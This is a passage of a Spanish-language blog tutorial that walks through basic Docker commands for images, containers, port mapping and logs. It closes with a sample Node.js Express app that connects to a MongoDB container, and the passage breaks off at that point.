&lt;p&gt;Pero en el caso de &lt;code&gt;Docker&lt;/code&gt;, unicamente virtualiza las aplicaciones, ya que en el caso del &lt;code&gt;Kernel&lt;/code&gt; lo que hace docker es utilizar el propio kernel del sistema operativo anfitrión.&lt;/p&gt;

&lt;p&gt;En consencuencia las imagenes pesan mucho menos, su rendimiento es superior ya que se ejecutan casi instantaneamente. Por lo que desarrollar y desplegar aplicaciones sera mucho mas rapido y optimo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;instalacion&quot;&gt;Instalación &lt;a href=&quot;#instalacion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder instalar &lt;code&gt;Docker&lt;/code&gt; si nos encontramos en &lt;code&gt;Windows&lt;/code&gt; debemos instalar &lt;code&gt;Docker Desktop&lt;/code&gt; que viene a ser una VM linux y nos permitira ejecutar contenedores.&lt;/p&gt;

&lt;p&gt;Si deseas descargarla puedes hacerlo desde el enlace oficial:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;https://www.docker.com/products/docker-desktop/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si te encuentras en &lt;code&gt;linux&lt;/code&gt; simplemente puedes instalarlo ejecutando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt update
sudo apt install docker-ce docker-ce-cli containerd.io
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;docker-hub&quot;&gt;Docker Hub &lt;a href=&quot;#docker-hub&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Una vez tengamos ya instalado &lt;code&gt;Docker&lt;/code&gt;, vamos a dirigirnos a el repositorio &lt;code&gt;Docker Hub&lt;/code&gt;, donde podemos ver todas las herramientas que podemos utilizar.&lt;/p&gt;

&lt;p&gt;Podemos ver que podemos usar imagenes de &lt;code&gt;Python&lt;/code&gt;, &lt;code&gt;Sql&lt;/code&gt;, &lt;code&gt;Ubuntu&lt;/code&gt;, &lt;code&gt;Node&lt;/code&gt; entre muchas mas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora pinchamos en alguna de ellas como &lt;code&gt;Python&lt;/code&gt; y deslizamos un poco podemos ver distintas versiones de &lt;code&gt;Python&lt;/code&gt; que podemos utilizar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora si subimos un poco, veremos un comando donde veremos un comando el cual si lo ejecutamos nos descargara la imagen respectiva en este caso la de &lt;code&gt;Python&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;listar-imagenes&quot;&gt;Listar Imagenes &lt;a href=&quot;#listar-imagenes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;El primer comando que ejecutaremos sera &lt;code&gt;docker images&lt;/code&gt; y este nos monstrara todas las imagenes que hemos descargado en nuestro sistema.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como podemos ver no nos lista nada debido a que todavia no contamos con ninguna imagen descargada.&lt;/p&gt;

&lt;h2 id=&quot;descargar-imagenes&quot;&gt;Descargar Imagenes &lt;a href=&quot;#descargar-imagenes&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Par poder descargar una imagen solo debemos de usar el comando &lt;code&gt;docker pull&lt;/code&gt;, ahora bien existen dos formas a traves de las cuales podemos hacerlo.&lt;/p&gt;

&lt;p&gt;La primera es simplemente ejecutar el comando y seguido el nombre de la aplicación que queremos descargar, esto por defecto nos descargara la ultima versión disponible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos como &lt;code&gt;docker&lt;/code&gt; descarga cada una de las capas que componen nuestra imagen y si en algun caso nosotros vamos a descargar otra imagen cuyas capas ya fueron descargadas antes por otra imagen como la que tenemos &lt;code&gt;mysql&lt;/code&gt;, estas capas no volveran a descargarse ya que usaran las que ya tenemos optimizando nuestro espacio en disco.&lt;/p&gt;

&lt;p&gt;Si ahora volvemos a listar las imagenes &lt;code&gt;docker images&lt;/code&gt;, observamos que esta vez ya contamos con una imagen descargada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si miramos con atención observamos que nuestra imagen tiene una serie de etiquetas.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;REPOSITORY:&lt;/strong&gt; Indica el nombre de la imagen&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;TAG:&lt;/strong&gt; Indica la versión utilizada, en este caso usa &lt;code&gt;latest&lt;/code&gt; al no haberla especificado.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IMAGE ID:&lt;/strong&gt; Corresponde a un identificador unico de la imagen.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CREATED:&lt;/strong&gt; Cuando fue creada la imagen.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;SIZE:&lt;/strong&gt; Espacio usado en disco.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La segunda manera en la que podemos descargar una imagen seria especificar la versión exacta que queremos descargar, para ello debemos agregar con &lt;code&gt;:version&lt;/code&gt; la versión de la imagen y ejecutar el mismo comando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que esta vez la imagen se nos descargo casi al instante. Si ahora volvemos a listar las imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues de volver a lista vemos que tenemos casi las mismas etiquetas, ya que al especificar la versión en la descarga, usamos la ultima y seria el mismo proceso al no especificar la versión ya que de esa manera tambien nos descarga la ultima versión. Solo que esta vez tenemos dos imagenes pero con distintos valores en el &lt;code&gt;TAG&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora vamos a descargar otra versión mas antigua de &lt;code&gt;mysql&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente las imagenes y esta vez ya que descargamos una versión previa observamos la nueva versión en conjunto con un nuevo identificador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera podemos descargarnos distintas imagenes con sus respectivas versiones y si queremos ver cuales estan disponibles, solo debemos dirigirnos a &lt;code&gt;Docker Hub&lt;/code&gt; y elegir la versión que necesitemos.&lt;/p&gt;

&lt;h2 id=&quot;eliminar-una-imagen&quot;&gt;Eliminar una Imagen &lt;a href=&quot;#eliminar-una-imagen&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Para poder eliminar una imagen previamente descargada, tenemos que ejecutar el comando &lt;code&gt;docker image rm nombre_imagen:version&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entonces listamos nuevamente las imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker17.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora procederemos a eliminar las versiones &lt;code&gt;8.0&lt;/code&gt; y &lt;code&gt;5.7&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker18.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listamos nuevamente las imagenes disponibles y vemos que se eliminaron con exito las versiones seleccionadas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker19.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;crear-un-contenedor&quot;&gt;Creación de un Contenedor &lt;a href=&quot;#crear-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder crear un contenedor, primero debemos tener descargada una imagen y ya que previamente estuvimos usando una correspondiente a &lt;code&gt;mysql&lt;/code&gt;, pero para realizar una variacion y simplicidad vamos a trabajar con &lt;code&gt;mongodb&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Asi que primero vamos a proceder a descargar la imagen de &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker23.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y volvemos a verificar que la imagen fue correctamente descargada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker24.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora para poder crear nuestro contenedor debemos ejecutar &lt;code&gt;docker create nombre_imagen&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker20.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto nos devuelve un identidicador del contenedor que creamos.&lt;/p&gt;

&lt;p&gt;Ahora tambien podriamos usar el comando &lt;code&gt;docker container create nombre_imagen&lt;/code&gt; para crear un contenedor, pero la forma anterior es mejor ya que lo simplifica.&lt;/p&gt;

&lt;h3 id=&quot;iniciar-un-contenedor&quot;&gt;Iniciar un Contenedor &lt;a href=&quot;#iniciar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Una vez ya creado nuestro contenedor, debemos iniciarlo para poder levantar el servicio que tengamos corriendo.&lt;/p&gt;

&lt;p&gt;Para ello usamos el comando &lt;code&gt;docker start id_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker21.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y de la misma manera nos devuelve el propio identificador como respuesta al ejectar el comando indicandonos que se inicio correctamente.&lt;/p&gt;

&lt;h3 id=&quot;listar-un-contenedor&quot;&gt;Listar Contenedores en Ejecución &lt;a href=&quot;#listar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder verificar que el contenedor se inicio de manera correcta tendremos que ejecutar el comando &lt;code&gt;docker ps&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker22.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este comando nos muestra un consunto de etiquetas que corresponden:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;CONTAINER ID:&lt;/strong&gt; Es el id del contenedor pero simplificado.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;IMAGE:&lt;/strong&gt; Indica en que imagen se baso el contenedor para su creación.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;COMMAND:&lt;/strong&gt; Es el comando que usa el contenedor para ejecutarse.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;CREATED:&lt;/strong&gt; Cuando fue creado el contenedor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;STATUS:&lt;/strong&gt; Indica el estado en el que se encuentra el contenedor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;PORTS:&lt;/strong&gt; Especifica el puerto del que se hace uso para ejecutar el contenedor.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;NAMES:&lt;/strong&gt; El nombre del contenedor.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;detener-un-contenedor&quot;&gt;Detener un Contenedor &lt;a href=&quot;#detener-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Que paso ahora si queremos detener la ejecución del contenedor, usamos el comando &lt;code&gt;docker stop id_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker25.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si tratamos ahora a mostrar los contenedores en ejecución, vemos que esta vez no nos devuelve nada debido a que detuvimos el que previamente creamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker26.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sin embargo esto no quiere decir que el contenedor se haya borrado ya que este sigue existiendo.&lt;/p&gt;

&lt;h3 id=&quot;listar-todos-los-contenedores&quot;&gt;Listar todos los Contenedores &lt;a href=&quot;#listar-todos-los-contenedores&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Anteriomente veiamos como listar los contenedores actualmente corriendo, pero que paso si queremos ver los contenedores que tenemos independientemente si estos esten o no activos solo hay que añadir un parametro al anterior comando &lt;code&gt;docker ps -a&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker27.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y esta vez podemos ver las mismas etiquetas, pero con la variación que ahora &lt;code&gt;STATUS&lt;/code&gt; nos muestra un estado &lt;code&gt;Exited (0) 3 min ago&lt;/code&gt; el cual nos indica que el contenedor detuvo su ejecución hace un aproximado de 3 min.&lt;/p&gt;

&lt;p&gt;Ademas debido a que ahora el contenedor no se encuentra activo, la etiqueta &lt;code&gt;PORTS&lt;/code&gt; se encuentra vacia.&lt;/p&gt;

&lt;h3 id=&quot;eliminar-un-contenedor&quot;&gt;Eliminar un Contenedor &lt;a href=&quot;#eliminar-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos eliminar un contenedor previamente creado y el cual no necesitemos, es super sencillo solo tenemos que ejecutar el comando &lt;code&gt;docker rm id_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker28.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si litamos ahora el comando que nos lista los contendores disponibles, vemos que fue eliminado exitosamente.&lt;/p&gt;

&lt;h3 id=&quot;establecer-nombre-a-un-contenedor&quot;&gt;Establecer Nombre a un Contenedor &lt;a href=&quot;#establecer-nombre-a-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Cuando listabamos los contenedores notamos que en la etiqueta &lt;code&gt;NAME&lt;/code&gt; se establecia un nombre extraño asignado al contenedor que creabamos, y esto sucede debido a que si nosotros al momento de crear nuestro contenedor no lo establecemos un nombre &lt;code&gt;docker&lt;/code&gt; por defecto lo genera aleatoriamente. Pero existe la posibilidad de nosotros establecer un nombre a nuestro contenedor y trabajar en función a el y no siempre usando el ID.&lt;/p&gt;

&lt;p&gt;Para ello solo debemos agregar el parametro &lt;code&gt;--name nombre_contenedor&lt;/code&gt;, por lo demas el comando seria exactamente igual.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker29.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente seria iniciarlo no?, pero ahora que le asignamos un nombre podemos usar este en lugar del ID. Seguidamente tambien vamos a verificar que nuestro contenedor se encuentra activo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker30.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que tenemos corriendo nuestro contenedor y esta vez con el nombre que le asignamos &lt;code&gt;mongo_container&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Lo ideal seria comenzar a usarlo, y como en nuestro caso corresponde a un servicio de base de datos guardar información. Sin embargo si queremos interactuar con este desde nuestra maquina &lt;code&gt;host&lt;/code&gt; no nos sera posible.&lt;/p&gt;

&lt;p&gt;y de seguro te preguntaras debido a que si nos nuestro contenedor esta funcionando correctamente?.&lt;/p&gt;

&lt;p&gt;Pues esto se debe a que cuando nosotros ejecutamos una aplicación dentro de un contenedor Docker, esta solo puede comunicarse con el mundo exterior a través de la &lt;code&gt;interfaz de red&lt;/code&gt; interna del contenedor, lo que significa que no puede acceder directamente a los puertos del host o a otros dispositivos en la red.&lt;/p&gt;

&lt;p&gt;Entonces para poder establecer esta comunicación usamos el concepto de &lt;code&gt;Port Mapping&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;ejecutar-comandos&quot;&gt;Ejecutar comandos dentro del Contenedor &lt;a href=&quot;#ejecutar-comandos&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Es importante mencionar que existe la opción de ejecutar comandos dentro de nuestro contenedor que se encutra corriendo, lo que es útil cuando queremos realizar tareas como administración o depuración del mismo.&lt;/p&gt;

&lt;p&gt;Para ello usamos el comando &lt;code&gt;docker exec id_contenedor|nombre_contenedor comando&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como sabemos nuestros contenedores estan basandos en &lt;code&gt;linux&lt;/code&gt; asi que podriamos ejecutar como comando una &lt;code&gt;bash&lt;/code&gt; y podriamos acceder mediante una terminal al contenedor, para ello vamos a crear un nuevo contenedor usando nuestra imagen de &lt;code&gt;mongo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker95.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tambien podriamos mostrar la version de &lt;code&gt;mongo&lt;/code&gt; que se esta ejecutando.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker96.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En otras palabras podemos ejecutar cualquier comando que nos permita interactuar con nuestros contenedores.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker97.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;port-mapping&quot;&gt;Port Mapping &lt;a href=&quot;#port-mapping&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;El &lt;code&gt;Port Mapping&lt;/code&gt; nos permite redireccionar solicitudes de un puerto específico en el host hacia un puerto específico dentro del contenedor. Esto hace que la aplicación dentro del contenedor sea accesible desde el host o desde otras máquinas de la red como si estuviera ejecutándose directamente en el host.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker31.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Par poder realizar este proceso de manera practica, primero vamos a proceder a eliminar nuestro contenedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker32.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a proceder a crear un nuevo contenedor y lo llamaremos de la misma manera que el previo, solo que esta vez para hacer uso del &lt;code&gt;Port Mapping&lt;/code&gt; usaremos un parametro mas &lt;code&gt;-p&lt;/code&gt; - &lt;code&gt;-ppuerto_host:puerto_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker33.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora en la etiqueta &lt;code&gt;PORT&lt;/code&gt; vemos que nuestro puerto host &lt;code&gt;27017&lt;/code&gt; esta mapeado a el puerto &lt;code&gt;27017&lt;/code&gt; de nuestro contenedor.&lt;/p&gt;

&lt;p&gt;Si ahora hacemos exactamente el mismo proceso, pero esta vez no especificamos nuestro puerto hosts, lo que pasara es que &lt;code&gt;Docker&lt;/code&gt; lo eligira por nosotros aleatoriamente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker34.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que esta vez &lt;code&gt;Docker&lt;/code&gt; nos asigno aleatoriamente el puerto &lt;code&gt;49153&lt;/code&gt;. Esto no nos conviene mucho ya que nosotros siempre queremos tener el control de que puerto queremos usar, pero no esta de mas saberlo.&lt;/p&gt;

&lt;h3 id=&quot;mostrar-logs&quot;&gt;Mostrar logs de un Contenedor &lt;a href=&quot;#mostrar-logs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Si queremos listar los logs de nuestro contenedor, para mostrar los registros con información detallada sobre el funcioamiento correcto o erroneo de nuestro contenedor tambien es muy sencillo, solo basta con ejecutar el comando &lt;code&gt;docker logs monbre_contenedor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker35.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y si ahora queremos listar los &lt;code&gt;logs&lt;/code&gt; pero a la vez mantenernos en escucha de nuevos registros, añadiremos al comando el parametro &lt;code&gt;--follow&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker36.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker37.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;docker-run&quot;&gt;Docker run &lt;a href=&quot;#docker-run&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Hemos estado viendo diversos comandos cuando usamos &lt;code&gt;Docker&lt;/code&gt;, como descargar una imagen, crear y desplegar nuestro contenedor cada uno con su respectivo comando, pero &lt;code&gt;Docker&lt;/code&gt; tambien nos da la opción de hacer todo el proceso en conjunto haciendo uso de un solo comando.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Seguro puedes decir entocnes para que aprendi el resto??.. si literalmente evito hacer tanto embrollo, pues hay que recordar que si bien podemos automatizar el proceso con este comando no quiere decir que en todo momento que uso docker voy a realizar la misma acción, ya que muchas veces vamos a realizar distintas operaciones por separado.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Y bueno para realizar esta operación debemos ejecutar el comando &lt;code&gt;docker run&lt;/code&gt; y este comando basicamente hara 4 operaciones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Buscar la imagen y si esta no se encuentra la descargara.&lt;/li&gt;
  &lt;li&gt;Crear un Contenedor&lt;/li&gt;
  &lt;li&gt;Iniciar el Contenedor&lt;/li&gt;
  &lt;li&gt;Mostrar los logs en escucha&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para apreciar mejor su funcionamiento, vamos a realizar el proceso entero, asi que vamos a borrar nuestros contenedores actuales.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker38.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Realizamos tambien el borrado de las imagenes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker39.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ejecutaremos el comando &lt;code&gt;docker run nombre_imagen&lt;/code&gt; y este lo que hara al no encontrar la imagen, sera descargarla para despues crear y iniciar nuestro contenedor, hasta que finalmente nos muestre los logs en escucha&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker41.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker42.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y otra cosa si queremos que nos realize todo el proceso, pero no queremos ver los &lt;code&gt;logs&lt;/code&gt;, solo tenemos que añadir el parametro &lt;code&gt;-d&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker43.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Otra cosa importante es que podemos usar los mismos parametros de antes incluidos en este comando, como asignarle un nombre &lt;code&gt;--name&lt;/code&gt; o usar el &lt;code&gt;Port Mapping&lt;/code&gt; con &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;De esta manera tendriamos desplegado nuestro contenendor y listo para poder usarlo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker44.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;conexion-con-un-contenedor&quot;&gt;Conexión con un Contenedor &lt;a href=&quot;#conexion-con-un-contenedor&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Para poder realizar la conexión de nuestros contenedores, vamos a estar usando &lt;code&gt;NodeJS&lt;/code&gt; y &lt;code&gt;MongoDB&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ejecutaremos un aplicativo simple en &lt;code&gt;NodeJS&lt;/code&gt; que se pueda conectar con un contenedor que esta ejecutando &lt;code&gt;MongoDB&lt;/code&gt; y de este modo al gestionar todo en contenedores no tengamos que descargarnos &lt;code&gt;Mongo&lt;/code&gt; en nuestro maquina &lt;code&gt;hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello a continuación te dejare el codigo de el aplicativo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const express = require(&quot;express&quot;);
const mongoose = require(&quot;mongoose&quot;);
const app = express();

const mongoURI =
  &quot;mongodb://firtsmiracle:firtsmiracle123@localhost:27017/universidad?authSource=admin&quot;;

mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true });

const studentSchema = new mongoose.Schema({
  nombre: { type: String, required: true },
  curso: { type: String, required: true },
  correo: { type: String, required: true },
});

const Student = mongoose.model(&quot;Student&quot;, studentSchema);

app.use(express.json());

// Ruta para crear un estudiante
app.post(&quot;/estudiantes&quot;, async (req, res) =&amp;gt; {
  try {
    const { nombre, curso, correo } = req.body;

    const newStudent = new Student({ nombre, curso, correo });
    const savedStudent = await newStudent.save();

    res.status(201).json(savedStudent);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: &quot;Error al crear el estudiante.&quot; });
  }
});

// Ruta para listar todos los estudiantes
app.get(&quot;/estudiantes&quot;, async (req, res) =&amp;gt; {
  try {
    const students = await Student.find();
    res.json(students);
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: &quot;Error al obtener los estudiantes.&quot; });
  }
});

// Ruta para eliminar un estudiante por su ID
app.delete(&quot;/estudiantes/:id&quot;, async (req, res) =&amp;gt; {
  try {
    const estudianteId = req.params.id;

    const deletedStudent = await Student.findByIdAndDelete(estudianteId);

    if (deletedStudent) {
      res.json({ message: &quot;Estudiante eliminado exitosamente.&quot; });
    } else {
      res.status(404).json({ message: &quot;Estudiante no encontrado.&quot; });
    }
  } catch (error) {
    console.error(error);
    res.status(500).json({ message: &quot;Error al eliminar el estudiante.&quot; });
  }
});

const port = 3000;
app.listen(port, () =&amp;gt; {
  console.log(`Servidor corriendo en http://localhost:${port}`);
});
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ello lo primero que tenemos que hacer es dirigirnos a &lt;code&gt;Docker Hub&lt;/code&gt; ya que vamos a necesitar una serie de parametros de configuración al momento de crear nuestro contenedor para acceder a nuestra base de datos.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://hub.docker.com/&quot;&gt;https://hub.docker.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez ahi ya que queremos usar mongo, usamos el buscado, esto nos llevara a otro apartado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker45.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Aqui encontraremos una lista de instrucciones para poder configurar nuestro contenedor.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-07-22-Docker/docker46.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
